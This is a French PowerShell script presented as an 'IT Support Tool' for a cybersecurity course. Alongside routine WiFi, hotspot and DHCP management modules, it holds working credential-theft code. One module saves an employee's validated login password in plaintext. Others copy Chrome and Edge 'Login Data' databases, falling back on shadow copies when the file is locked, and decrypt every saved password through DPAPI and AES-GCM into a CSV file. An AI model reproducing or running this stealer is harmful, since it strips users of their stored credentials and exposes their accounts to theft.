```powershell
# =============================================
# IT SUPPORT TOOL - FUSION FINALE + DÉCHIFFREMENT DPAPI AUTO
# Niveau 5 Cybersécurité / HACH
# =============================================

#Requires -RunAsAdministrator

$Host.UI.RawUI.WindowTitle = "IT Support Tool - Fusion + Déchiffrement Auto"

$MachineName  = $env:COMPUTERNAME
$CurrentUser  = $env:USERNAME
$Date         = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"

# ── Vérification droits admin ──────────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERREUR] Ce script doit être exécuté en tant qu'Administrateur." -ForegroundColor Red
    exit 1
}

# ── Création du dossier d'export ───────────────────────────────────────────────
try {
    New-Item -Path $ExportFolder -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Host "Dossier créé : $ExportFolder" -ForegroundColor Green
} catch {
    Write-Host "[ERREUR] Impossible de créer le dossier d'export : $_" -ForegroundColor Red
    exit 1
}

Write-Host "`n=== IT SUPPORT TOOL - VERSION FINALE FUSIONNEE ===" -ForegroundColor Green
Write-Host "Machine : $MachineName | User : $CurrentUser`n" -ForegroundColor Yellow


# ==============================================================================
# MODULE 1 — SAUVEGARDE MOT DE PASSE EMPLOYE (via LogonUser Win32 API)
# ==============================================================================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword {
    Write-Host "`n=== [MODULE 1] SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan

    $emp = Read-Host "Nom utilisateur (vide = $CurrentUser)"
    if ([string]::IsNullOrWhiteSpace($emp)) { $emp = $CurrentUser }

    $domain = Read-Host "Domaine (vide = machine locale)"
    if ([string]::IsNullOrWhiteSpace($domain)) { $domain = "." }

    $logonType = 3   # LOGON32_LOGON_NETWORK

    for ($i = 1; $i -le 3; $i++) {
        $pass  = Read-Host "Mot de passe de $emp (tentative $i/3)" -AsSecureString
        $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
                     [Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))

        $token = [IntPtr]::Zero
        try {
            if ([Win32]::LogonUser($emp, $domain, $plain, $logonType, 0, [ref]$token)) {
                [Win32]::CloseHandle($token) | Out-Null

                $file = "$ExportFolder\Password_${emp}_${Date}.txt"
                @"
Utilisateur : $emp
Domaine     : $domain
Mot de passe: $plain
Date        : $(Get-Date)
Machine     : $MachineName
"@ | Out-File $file -Encoding UTF8

                Write-Host "✓ Mot de passe validé et sauvegardé : $file" -ForegroundColor Green
                return
            } else {
                $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Host "✗ Incorrect - code erreur Win32 : $err ($i/3)" -ForegroundColor Red
            }
        } catch {
            Write-Host "[ERREUR] LogonUser : $_" -ForegroundColor Red
        }
    }
    Write-Host "Nombre maximum de tentatives atteint." -ForegroundColor Red
}


# ==============================================================================
# MODULE 2 — EXPORT FICHIER BRUT NAVIGATEUR (copie de Login Data)
# ==============================================================================
function Export-BrowserPasswords {
    Write-Host "`n=== [MODULE 2] EXPORT NAVIGATEUR (fichier brut) ===" -ForegroundColor Cyan
    Write-Host "1. Chrome`n2. Edge"
    $nav = Read-Host "Choix"

    switch ($nav) {
        "1" { $browser = "Chrome"; $base = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $base)) {
        Write-Host "$browser non trouvé sur cette machine." -ForegroundColor Red
        return
    }

    $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }

    if ($profiles.Count -eq 0) {
        Write-Host "Aucun profil trouvé." -ForegroundColor Red
        return
    }

    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    $list = @()
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        $p = $profiles[$i]
        $displayName = $p.Name
        $pref = Join-Path $p.FullName "Preferences"
        if (Test-Path $pref) {
            try {
                $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($json.profile.name) { $displayName = $json.profile.name }
            } catch { }
        }
        Write-Host "  $($i+1). $displayName  [$($p.Name)]" -ForegroundColor White
        $list += [PSCustomObject]@{ Index = $i; Folder = $p; Display = $displayName }
    }

    $num = Read-Host "`nNuméro du profil à exporter"
    $selected = $list[$num - 1]
    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    $dbPath = Join-Path $selected.Folder.FullName "Login Data"
    if (-not (Test-Path $dbPath)) {
        Write-Host "Aucun fichier 'Login Data' dans ce profil." -ForegroundColor Red
        return
    }

    $cleanName = $selected.Display -replace '[^\w]', '_'
    $destDb = "$ExportFolder\${browser}_${cleanName}_LoginData_${Date}.db"

    try {
        Copy-Item $dbPath $destDb -Force -ErrorAction Stop
        Write-Host "✓ Fichier Login Data copié : $destDb" -ForegroundColor Green
    } catch {
        Write-Host "  Fichier verrouillé, tentative via VSS..." -ForegroundColor Yellow
        try {
            $shadow = (Get-WmiObject -Class Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1).DeviceObject
            if ($shadow) {
                $shadowPath = "$shadow\" + ($dbPath -replace "^[A-Z]:\\", "")
                Copy-Item $shadowPath $destDb -Force -ErrorAction Stop
                Write-Host "✓ Copié via VSS : $destDb" -ForegroundColor Green
            }
        } catch {
            Write-Host "[ERREUR] VSS échoué : $_" -ForegroundColor Red
        }
    }

    Write-Host "`n[INFO] Fichier brut exporté. Utilise le module 2.5 pour le déchiffrement." -ForegroundColor DarkYellow
}


# ==============================================================================
# MODULE 2.5 — DÉCHIFFREMENT AUTOMATIQUE (compatible PS5.1 / PS7+)
# ==============================================================================

function Decrypt-BrowserPasswords {
    Write-Host "`n=== [MODULE 2.5] DÉCHIFFREMENT AUTOMATIQUE CHROME/EDGE ===" -ForegroundColor Cyan

    # Vérifier la présence de l'assembly System.Security (nécessaire pour ProtectedData)
    try {
        Add-Type -AssemblyName System.Security -ErrorAction Stop
    } catch {
        Write-Host "[ERREUR] Impossible de charger System.Security. Arrêt du module." -ForegroundColor Red
        return
    }

    # Vérifier si AesGcm est disponible (PS7+ uniquement)
    $aesGcmAvailable = $true
    try {
        [System.Security.Cryptography.AesGcm]::new([byte[]]::new(32)) | Out-Null
    } catch {
        $aesGcmAvailable = $false
        Write-Host "[AVERTISSEMENT] AesGcm non disponible (PowerShell 5.1)." -ForegroundColor DarkYellow
        Write-Host "Seuls les mots de passe au format DPAPI (anciens) pourront être déchiffrés." -ForegroundColor DarkYellow
        Write-Host "Pour déchiffrer les mots de passe modernes (AES-GCM), installez PowerShell 7+ :" -ForegroundColor DarkYellow
        Write-Host "https://aka.ms/powershell" -ForegroundColor Cyan
    }

    # Demander le navigateur
    Write-Host "1. Chrome`n2. Edge"
    $choice = Read-Host "Choix"

    switch ($choice) {
        "1" { $browser = "Chrome"; $basePath = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $basePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        default { Write-Host "Choix invalide." -ForegroundColor Red; return }
    }

    if (-not (Test-Path $basePath)) {
        Write-Host "$browser non trouvé." -ForegroundColor Red
        return
    }

    # Lister les profils
    $profiles = Get-ChildItem $basePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
    Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
    $list = @()
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        $p = $profiles[$i]
        $displayName = $p.Name
        $pref = Join-Path $p.FullName "Preferences"
        if (Test-Path $pref) {
            try {
                $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($json.profile.name) { $displayName = $json.profile.name }
            } catch { }
        }
        Write-Host "  $($i+1). $displayName  [$($p.Name)]" -ForegroundColor White
        $list += [PSCustomObject]@{Index = $i; Folder = $p; Display = $displayName}
    }

    $num = Read-Host "`nNuméro du profil"
    $selected = $list[$num-1]
    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    $loginDb = Join-Path $selected.Folder.FullName "Login Data"
    $localStatePath = Join-Path $selected.Folder.Parent.FullName "Local State"

    if (-not (Test-Path $loginDb)) {
        Write-Host "Fichier Login Data introuvable." -ForegroundColor Red
        return
    }

    $outputCsv = "$ExportFolder\${browser}_Passwords_Decrypted_${Date}.csv"

    try {
        # Récupération de la Master Key (si AES-GCM)
        $masterKey = $null
        if ($aesGcmAvailable -and (Test-Path $localStatePath)) {
            $localState = Get-Content $localStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
            if ($localState.os_crypt.encrypted_key) {
                $encKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
                # Enlève le préfixe "DPAPI" (5 premiers octets)
                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
                Write-Host "✓ Master key récupérée (AES-GCM)" -ForegroundColor Green
            }
        } elseif (-not $aesGcmAvailable) {
            Write-Host "AES-GCM non disponible : seuls les anciens mots de passe (DPAPI) seront déchiffrés." -ForegroundColor DarkYellow
        }

        # Copie temporaire de la base SQLite
        $tempDb = "$env:TEMP\LoginData_$(Get-Random).db"
        Copy-Item $loginDb $tempDb -Force

        # Vérifier sqlite3.exe
        $sqlite = Get-Command sqlite3.exe -ErrorAction SilentlyContinue
        if (-not $sqlite) {
            Write-Host "[ERREUR] sqlite3.exe non trouvé !" -ForegroundColor Red
            Write-Host "Téléchargez-le depuis https://sqlite.org/download.html" -ForegroundColor Yellow
            return
        }

        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value != '';"
        $rows = & sqlite3.exe $tempDb $query 2>$null

        $results = @()

        foreach ($row in $rows) {
            $f = $row -split '\|'
            if ($f.Count -ge 3) {
                $url = $f[0]
                $user = $f[1]
                $encHex = $f[2]
                $password = "[ERREUR_DECHIFFREMENT]"

                try {
                    # Convertir la chaîne hexadécimale en bytes
                    $encBytes = [byte[]]::new($encHex.Length / 2)
                    for ($j = 0; $j -lt $encHex.Length; $j += 2) {
                        $encBytes[$j/2] = [Convert]::ToByte($encHex.Substring($j, 2), 16)
                    }

                    # Tentative de déchiffrement selon le format
                    if ($masterKey -and $aesGcmAvailable) {
                        # Format AES-GCM (Chrome >= 80, Edge Chromium)
                        $password = Decrypt-AesGcm $encBytes $masterKey
                    } else {
                        # Ancien format DPAPI
                        $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, 'CurrentUser'))
                    }
                } catch {
                    # Échec : on laisse le message d'erreur
                }

                $results += [PSCustomObject]@{ URL = $url; Username = $user; Password = $password }
            }
        }

        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue

        if ($results.Count -gt 0) {
            $results | Export-Csv -Path $outputCsv -Encoding UTF8 -NoTypeInformation
            Write-Host "`n✓ $($results.Count) mots de passe traités (déchiffrés si possible) !" -ForegroundColor Green
            Write-Host "Fichier : $outputCsv" -ForegroundColor Green
        } else {
            Write-Host "Aucun mot de passe trouvé." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[ERREUR] $_" -ForegroundColor Red
        Write-Host "→ Assurez-vous d'exécuter ce script dans la session de l'utilisateur cible." -ForegroundColor DarkYellow
    }
}

# Fonction de déchiffrement AES-GCM (ne fonctionne que sous PS7+)
function Decrypt-AesGcm($encryptedBytes, $masterKey) {
    # Structure d'un blob AES-GCM de Chrome/Edge :
    # - octet 0 : version (0x76 = 'v')
    # - octets 1-2 : non utilisé ? 
    # - octets 3-14 : IV (12 octets)
    # - octets 15..(len-17) : ciphertext
    # - derniers 16 octets : tag
    if ($encryptedBytes.Length -lt 31) { return "[BLOB_TROP_COURT]" }
    $iv = $encryptedBytes[3..14]
    $cipher = $encryptedBytes[15..($encryptedBytes.Length - 17)]
    $tag = $encryptedBytes[($encryptedBytes.Length - 16)..($encryptedBytes.Length - 1)]

    $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
    $dec = [byte[]]::new($cipher.Length)
    $aes.Decrypt($iv, $cipher, $tag, $dec)
    return [System.Text.Encoding]::UTF8.GetString($dec)
}

# ==============================================================================
# MODULE 3 — BLOCAGE PARTAGE CONNEXION (Version Prof complète)
# ==============================================================================
function Manage-Sharing {
    Write-Host "`n=== [MODULE 3] GESTION PARTAGE DE CONNEXION ===" -ForegroundColor Cyan
    Write-Host "1. Activer le partage (hotspot)"
    Write-Host "2. Désactiver le partage (hotspot)"
    Write-Host "3. BLOQUER complètement (désactivation admin de l'adaptateur virtuel)"
    $c = Read-Host "Choix"

    switch ($c) {
        "1" {
            netsh wlan set hostednetwork mode=allow | Out-Null
            netsh wlan start hostednetwork | Out-Null
            Write-Host "✓ Partage activé." -ForegroundColor Green
        }
        "2" {
            netsh wlan stop hostednetwork | Out-Null
            netsh wlan set hostednetwork mode=disallow | Out-Null
            Write-Host "✓ Partage désactivé." -ForegroundColor Yellow
        }
        "3" {
            # Étape 1 : désactiver l'adaptateur source (RJ45 / Ethernet)
            $ethernet = Get-NetAdapter | Where-Object {
                $_.InterfaceDescription -notlike "*Wi-Fi Direct*" -and
                $_.InterfaceDescription -notlike "*Wireless*" -and
                $_.InterfaceDescription -notlike "*Virtual*" -and
                $_.Status -eq "Up"
            }
            foreach ($nic in $ethernet) {
                try {
                    Disable-NetAdapter -Name $nic.Name -Confirm:$false -ErrorAction Stop
                    Write-Host "  Adaptateur source désactivé : $($nic.Name)" -ForegroundColor Yellow
                } catch {
                    Write-Host "  [AVERT] Impossible de désactiver $($nic.Name) : $_" -ForegroundColor DarkYellow
                }
            }

            # Étape 2 : activer le hotspot pour forcer la création de l'adaptateur virtuel
            netsh wlan set hostednetwork mode=allow | Out-Null
            netsh wlan start hostednetwork | Out-Null
            Start-Sleep -Seconds 2

            # Étape 3 : détecter et désactiver l'adaptateur virtuel Wi-Fi Direct
            $virtual = Get-NetAdapter | Where-Object {
                $_.InterfaceDescription -like "*Wi-Fi Direct*" -or
                $_.Name -like "*Local Area Connection*" -and $_.InterfaceDescription -like "*Microsoft*"
            }
            if ($virtual) {
                foreach ($v in $virtual) {
                    try {
                        Disable-NetAdapter -Name $v.Name -Confirm:$false -ErrorAction Stop
                        Write-Host "  Adaptateur virtuel bloqué : $($v.Name)" -ForegroundColor Red
                    } catch {
                        Write-Host "  [ERREUR] $($v.Name) : $_" -ForegroundColor Red
                    }
                }
            } else {
                Write-Host "  Aucun adaptateur virtuel détecté (peut-être déjà inexistant)." -ForegroundColor DarkYellow
            }

            # Étape 4 : interdire le mode hotspot au niveau registre (persistant)
            try {
                $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings"
                if (-not (Test-Path $regPath)) {
                    New-Item -Path $regPath -Force | Out-Null
                }
                Set-ItemProperty -Path $regPath -Name "HostedNetworkEnabled" -Value 0 -Type DWord -Force
                Write-Host "✓ PARTAGE BLOQUÉ (adaptateur virtuel désactivé + registre verrouillé)." -ForegroundColor Red
            } catch {
                Write-Host "  [AVERT] Verrouillage registre échoué : $_" -ForegroundColor DarkYellow
            }
        }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
}


# ==============================================================================
# MODULE 4 — GESTION WIFI (activation / désactivation / blocage persistant)
# ==============================================================================
function Manage-WiFi {
    Write-Host "`n=== [MODULE 4] GESTION WIFI ===" -ForegroundColor Cyan

    $wifi = Get-NetAdapter | Where-Object {
        ($_.Name -like "*Wi-Fi*" -or $_.InterfaceDescription -like "*Wireless*") -and
        $_.InterfaceDescription -notlike "*Wi-Fi Direct*"
    }
    if (-not $wifi) { Write-Host "Aucun adaptateur WiFi trouvé." -ForegroundColor Red; return }

    Write-Host "Adaptateur WiFi détecté : $($wifi.Name) [$($wifi.InterfaceDescription)]" -ForegroundColor White
    Write-Host "1. Activer WiFi"
    Write-Host "2. Désactiver WiFi (temporaire)"
    Write-Host "3. BLOQUER WiFi (désactivation admin — seul admin peut réactiver)"
    $c = Read-Host "Choix"

    switch ($c) {
        "1" {
            try {
                Enable-NetAdapter -Name $wifi.Name -Confirm:$false -ErrorAction Stop
                Write-Host "✓ WiFi activé." -ForegroundColor Green
            } catch {
                Write-Host "[ERREUR] $_ " -ForegroundColor Red
            }
        }
        "2" {
            try {
                Disable-NetAdapter -Name $wifi.Name -Confirm:$false -ErrorAction Stop
                Write-Host "✓ WiFi désactivé." -ForegroundColor Yellow
            } catch {
                Write-Host "[ERREUR] $_" -ForegroundColor Red
            }
        }
        "3" {
            try {
                netsh interface set interface name="$($wifi.Name)" admin=disabled | Out-Null
                Write-Host "✓ WiFi BLOQUÉ (netsh admin=disabled)." -ForegroundColor Red
            } catch {
                Write-Host "[ERREUR] netsh : $_" -ForegroundColor Red
            }

            # Verrouillage supplémentaire via registre
            try {
                $nicGuid = (Get-NetAdapter -Name $wifi.Name).InterfaceGuid
                $regNic  = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
                $subKeys = Get-ChildItem $regNic -ErrorAction SilentlyContinue
                foreach ($key in $subKeys) {
                    $netCfgId = (Get-ItemProperty $key.PSPath -Name "NetCfgInstanceId" -ErrorAction SilentlyContinue).NetCfgInstanceId
                    if ($netCfgId -eq $nicGuid) {
                        Set-ItemProperty -Path $key.PSPath -Name "Characteristics" -Value 0x84 -Type DWord -Force
                        Write-Host "  Registre NIC verrouillé (GUID : $nicGuid)." -ForegroundColor DarkRed
                    }
                }
            } catch {
                Write-Host "  [AVERT] Verrouillage registre NIC : $_" -ForegroundColor DarkYellow
            }
        }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
}


# ==============================================================================
# MODULE 5 — GESTION RÉSEAU (DHCP / Statique / Redémarrage / Désinstall)
# ==============================================================================
function Manage-Network {
    Write-Host "`n=== [MODULE 5] GESTION RESEAU ===" -ForegroundColor Cyan

    $adapters = Get-NetAdapter | Where-Object {
        $_.Status -ne "Not Present" -and
        $_.InterfaceDescription -notlike "*Loopback*"
    }
    if ($adapters.Count -eq 0) { Write-Host "Aucun adaptateur réseau trouvé." -ForegroundColor Red; return }

    Write-Host "`nAdaptateurs disponibles :" -ForegroundColor Yellow
    for ($i = 0; $i -lt $adapters.Count; $i++) {
        $a      = $adapters[$i]
        $status = if ($a.Status -eq "Up") { "↑ Actif" } else { "↓ $($a.Status)" }
        Write-Host "  $($i+1). $($a.Name)  [$($a.InterfaceDescription)]  — $status" -ForegroundColor White
    }

    $num      = Read-Host "`nNuméro de l'adaptateur"
    $selected = $adapters[$num - 1]
    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }

    Write-Host "`nAdaptateur sélectionné : $($selected.Name)" -ForegroundColor Cyan
    Write-Host "1. Passer en DHCP (adresse automatique)"
    Write-Host "2. Configurer une adresse IP statique"
    Write-Host "3. Redémarrer l'adaptateur (désactiver / réactiver)"
    Write-Host "4. Désactiver l'adaptateur"
    Write-Host "5. Activer l'adaptateur"
    Write-Host "6. Désinstaller l'adaptateur (supprime le pilote de la session)"
    Write-Host "7. Réinstaller / Réinitialiser la pile réseau (netsh reset)"
    Write-Host "8. Forcer un refresh DHCP (release + renew)"
    Write-Host "9. [URGENCE] Réactiver + DHCP forcé (netsh pur — après reset Winsock)" -ForegroundColor DarkYellow
    $c = Read-Host "Choix"

    switch ($c) {
        "1" {
            if ($selected.Status -ne "Up") {
                Write-Host "  Adaptateur inactif, tentative de réactivation..." -ForegroundColor Yellow
                try {
                    netsh interface set interface name="$($selected.Name)" admin=enabled | Out-Null
                    Enable-NetAdapter -Name $selected.Name -Confirm:$false -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 3
                } catch { }
            }

            Write-Host "  Configuration DHCP via netsh..." -ForegroundColor Yellow
            netsh interface ip set address name="$($selected.Name)" source=dhcp | Out-Null
            netsh interface ip set dns    name="$($selected.Name)" source=dhcp | Out-Null

            try {
                Set-NetIPInterface -InterfaceAlias $selected.Name -Dhcp Enabled -ErrorAction Stop
                Set-DnsClientServerAddress -InterfaceAlias $selected.Name -ResetServerAddresses -ErrorAction SilentlyContinue
            } catch {
                Write-Host "  (cmdlet PS non dispo sur cet état — netsh utilisé à la place)" -ForegroundColor DarkYellow
            }

            Write-Host "✓ $($selected.Name) repassé en DHCP." -ForegroundColor Green

            Start-Sleep -Seconds 1
            ipconfig /release "$($selected.Name)" 2>$null | Out-Null
            Start-Sleep -Seconds 1
            ipconfig /renew   "$($selected.Name)" 2>$null | Out-Null

            $newIP = (Get-NetIPAddress -InterfaceAlias $selected.Name -AddressFamily IPv4 -ErrorAction SilentlyContinue).IPAddress
            if ($newIP) {
                Write-Host "  Nouvelle IP obtenue : $newIP" -ForegroundColor Green
            } else {
                Write-Host "  Aucune IP obtenue — vérifie que le câble est branché ou redémarre la machine." -ForegroundColor DarkYellow
            }
        }
        "2" {
            $ip      = Read-Host "Adresse IP (ex: 192.168.1.100)"
            $mask    = Read-Host "Longueur préfixe (ex: 24 pour /24)"
            $gw      = Read-Host "Passerelle (ex: 192.168.1.1)"
            $dns1    = Read-Host "DNS primaire (ex: 8.8.8.8)"
            $dns2    = Read-Host "DNS secondaire (vide = aucun)"

            try {
                Get-NetIPAddress -InterfaceAlias $selected.Name -ErrorAction SilentlyContinue |
                    Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue
                Get-NetRoute -InterfaceAlias $selected.Name -DestinationPrefix "0.0.0.0/0" `
                    -ErrorAction SilentlyContinue | Remove-NetRoute -Confirm:$false -ErrorAction SilentlyContinue

                Set-NetIPInterface -InterfaceAlias $selected.Name -Dhcp Disabled -ErrorAction Stop

                New-NetIPAddress -InterfaceAlias $selected.Name -IPAddress $ip `
                    -PrefixLength ([int]$mask) -DefaultGateway $gw -ErrorAction Stop | Out-Null

                $dnsServers = @($dns1)
                if (-not [string]::IsNullOrWhiteSpace($dns2)) { $dnsServers += $dns2 }
                Set-DnsClientServerAddress -InterfaceAlias $selected.Name `
                    -ServerAddresses $dnsServers -ErrorAction Stop

                Write-Host "✓ IP statique configurée : $ip/$mask  GW:$gw  DNS:$($dnsServers -join ', ')" -ForegroundColor Green
            } catch {
                Write-Host "[ERREUR] IP statique : $_" -ForegroundColor Red
            }
        }
        "3" {
            try {
                Disable-NetAdapter -Name $selected.Name -Confirm:$false -ErrorAction Stop
                Write-Host "  Adaptateur désactivé..." -ForegroundColor Yellow
                Start-Sleep -Seconds 2
                Enable-NetAdapter -Name $selected.Name -Confirm:$false -ErrorAction Stop
                Write-Host "✓ Adaptateur redémarré : $($selected.Name)" -ForegroundColor Green
            } catch {
                Write-Host "[ERREUR] Redémarrage : $_" -ForegroundColor Red
            }
        }
        "4" {
            try {
                Disable-NetAdapter -Name $selected.Name -Confirm:$false -ErrorAction Stop
                Write-Host "✓ Adaptateur désactivé : $($selected.Name)" -ForegroundColor Yellow
            } catch {
                Write-Host "[ERREUR] $_" -ForegroundColor Red
            }
        }
        "5" {
            try {
                Enable-NetAdapter -Name $selected.Name -Confirm:$false -ErrorAction Stop
                Write-Host "✓ Adaptateur activé : $($selected.Name)" -ForegroundColor Green
            } catch {
                Write-Host "[ERREUR] $_" -ForegroundColor Red
            }
        }
        "6" {
            Write-Host "[AVERT] La désinstallation supprime l'adaptateur de la session." -ForegroundColor DarkYellow
            $confirm = Read-Host "Confirmer ? (O/N)"
            if ($confirm -eq "O") {
                try {
                    $pnp = Get-PnpDevice | Where-Object {
                        $_.FriendlyName -like "*$($selected.InterfaceDescription)*" -or
                        $_.FriendlyName -like "*$($selected.Name)*"
                    } | Select-Object -First 1

                    if ($pnp) {
                        Disable-PnpDevice -InstanceId $pnp.InstanceId -Confirm:$false -ErrorAction Stop
                        Write-Host "✓ Périphérique réseau désactivé (PnP) : $($pnp.FriendlyName)" -ForegroundColor Red
                        Write-Host "  Pour désinstaller complètement, utilise le Gestionnaire de périphériques." -ForegroundColor DarkYellow
                    } else {
                        Write-Host "[ERREUR] Périphérique PnP correspondant non trouvé." -ForegroundColor Red
                    }
                } catch {
                    Write-Host "[ERREUR] $_" -ForegroundColor Red
                }
            } else {
                Write-Host "Annulé." -ForegroundColor Yellow
            }
        }
        "7" {
            Write-Host "[INFO] Réinitialisation de la pile TCP/IP et Winsock..." -ForegroundColor Yellow
            Write-Host "       Un redémarrage sera nécessaire." -ForegroundColor Yellow
            try {
                netsh int ip reset   | Out-Null
                netsh winsock reset  | Out-Null
                ipconfig /flushdns   | Out-Null
                Write-Host "✓ Pile réseau réinitialisée. Redémarre la machine pour appliquer." -ForegroundColor Green
            } catch {
                Write-Host "[ERREUR] Reset réseau : $_" -ForegroundColor Red
            }
        }
        "8" {
            try {
                Write-Host "  Release en cours..." -ForegroundColor Yellow
                ipconfig /release $selected.Name | Out-Null
                Start-Sleep -Seconds 1
                Write-Host "  Renew en cours..." -ForegroundColor Yellow
                ipconfig /renew   $selected.Name | Out-Null
                Write-Host "✓ Refresh DHCP effectué sur $($selected.Name)." -ForegroundColor Green

                $newIP = (Get-NetIPAddress -InterfaceAlias $selected.Name `
                           -AddressFamily IPv4 -ErrorAction SilentlyContinue).IPAddress
                if ($newIP) { Write-Host "  Nouvelle IP : $newIP" -ForegroundColor White }
            } catch {
                Write-Host "[ERREUR] DHCP refresh : $_" -ForegroundColor Red
            }
        }
        "9" {
            Write-Host "`n[URGENCE] Réactivation et DHCP forcé via netsh pur..." -ForegroundColor DarkYellow
            $nicName = $selected.Name

            netsh interface set interface name="$nicName" admin=enabled
            Start-Sleep -Seconds 3

            netsh interface ip set address name="$nicName" source=dhcp
            netsh interface ip set dns    name="$nicName" source=dhcp
            netsh interface ip set wins   name="$nicName" source=dhcp

            ipconfig /flushdns | Out-Null

            ipconfig /release "$nicName" 2>$null | Out-Null
            Start-Sleep -Seconds 2
            ipconfig /renew   "$nicName" 2>$null | Out-Null

            Write-Host "✓ Réactivation forcée effectuée sur : $nicName" -ForegroundColor Green
            Write-Host "  Si toujours pas d'IP, un REDÉMARRAGE est nécessaire (impact du netsh ip/winsock reset)." -ForegroundColor Yellow

            ipconfig | Select-String -Pattern "$nicName|IPv4|Passerelle" | ForEach-Object {
                Write-Host "  $_" -ForegroundColor White
            }
        }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
}


# ==============================================================================
# MENU PRINCIPAL MIS À JOUR (inclut 2.5)
# ==============================================================================
function Show-Menu {
    Write-Host "`n╔════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "║       IT SUPPORT TOOL — MENU FINAL         ║" -ForegroundColor Magenta
    Write-Host "╠════════════════════════════════════════════╣" -ForegroundColor Magenta
    Write-Host "║  1. Sauvegarder mot de passe employé      ║" -ForegroundColor White
    Write-Host "║  2. Exporter Navigateur (brut)            ║" -ForegroundColor White
    Write-Host "║  2.5 Déchiffrer DPAPI (Auto AES-GCM)      ║" -ForegroundColor Green
    Write-Host "║  3. Gérer partage de connexion            ║" -ForegroundColor White
    Write-Host "║  4. Gérer WiFi                            ║" -ForegroundColor White
    Write-Host "║  5. Gestion réseau (DHCP/IP/NIC)          ║" -ForegroundColor White
    Write-Host "║  6. TOUT EXÉCUTER (1 + 2 + 2.5)           ║" -ForegroundColor Yellow
    Write-Host "║  Q. Quitter                               ║" -ForegroundColor Red
    Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Magenta
    return (Read-Host "Votre choix")
}

do {
    $choice = Show-Menu
    switch ($choice.ToUpper()) {
        "1"   { Save-EmployeePassword }
        "2"   { Export-BrowserPasswords }
        "2.5" { Decrypt-BrowserPasswords }
        "25"  { Decrypt-BrowserPasswords }
        "3"   { Manage-Sharing }
        "4"   { Manage-WiFi }
        "5"   { Manage-Network }
        "6"   { Save-EmployeePassword; Export-BrowserPasswords; Decrypt-BrowserPasswords }
        "Q"   { Write-Host "`nAu revoir !" -ForegroundColor Green }
        default { Write-Host "Choix invalide." -ForegroundColor Red }
    }
    if ($choice.ToUpper() -ne "Q") {
        Read-Host "`nAppuyez sur Entrée pour continuer..."
    }
} while ($choice.ToUpper() -ne "Q")

Write-Host "`nTerminé. Tous les exports sont dans : $ExportFolder" -ForegroundColor Green
```
